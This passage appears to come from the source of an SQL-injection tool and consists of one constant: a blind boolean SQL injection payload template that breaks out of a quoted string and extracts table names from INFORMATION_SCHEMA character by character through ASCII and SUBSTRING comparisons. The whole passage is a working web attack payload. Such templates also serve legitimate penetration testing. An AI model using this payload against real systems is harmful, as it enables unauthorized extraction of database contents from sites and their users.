...
BLIND_BOOLEAN_DB_NAME_CHAR = "\' or (SELECT ASCII(UPPER(SUBSTRING(TABLE_NAME, %s, 1))) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA = \'%s\' ORDER BY TABLE_NAME LIMIT %s,1) %s %s%s"
